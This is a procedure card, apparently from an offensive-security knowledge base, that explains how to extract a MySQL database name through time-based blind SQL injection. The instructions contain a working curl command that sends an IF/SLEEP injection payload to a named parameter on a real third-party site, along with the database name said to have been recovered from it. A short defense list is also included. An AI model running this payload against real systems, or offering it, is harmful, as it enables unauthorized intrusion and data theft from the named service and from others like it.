---
id: proc-sqli-extract-db-001
tags:
  - sqli
  - blind-sqli
  - enumeration
  - database
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.957Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract Database Name via Blind SQLi

## Summary

This procedure uses conditional time-based payloads to extract the MySQL database name 'id_commxn2s' through inference from response delays, demonstrating blind data exfiltration.

## Description

After confirming injection, attackers use functions like database() with SUBSTRING and ASCII comparisons in IF/SLEEP conditions to guess characters one by one. Each correct guess causes a delay, allowing reconstruction of sensitive metadata like DB names, which can lead to further enumeration of tables and user data.

## Requirements

1. Confirmed injectable endpoint
2. Scripting tool for automated boolean/timing queries (e.g., Python with requests)
3. Patience for sequential queries (10-20 per character)

## Defense

Defensive measures and detection strategies:

- Encrypt database names or use non-descriptive schemas
- Limit query complexity and monitor for conditional statements
- Deploy anomaly detection on response times

## Objectives

1. Leak database name via timing oracles
2. Identify backend structure
3. Enable targeted data extraction

## Instructions

### Step 1: Craft Conditional Payloads

**Context**: Use payloads like 'AND IF(ASCII(SUBSTRING(database(),1,1))=105,SLEEP(5),0)' to test first character (i=105).

**Command** (Manual curl adaptation):
```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523' AND IF(ASCII(SUBSTRING(database(),1,1))=105,SLEEP(5),0)-- " -H "Host: www.intensedebate.com"
```

> Delay confirms 'i'; repeat for each position and character range (32-126).

### Step 2: Iterate and Reconstruct

**Context**: Automate or manually test all positions until full name is known.

> Expected: Delays reveal 'id_commxn2s' after multiple iterations.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- enumeration
- blind-exfil
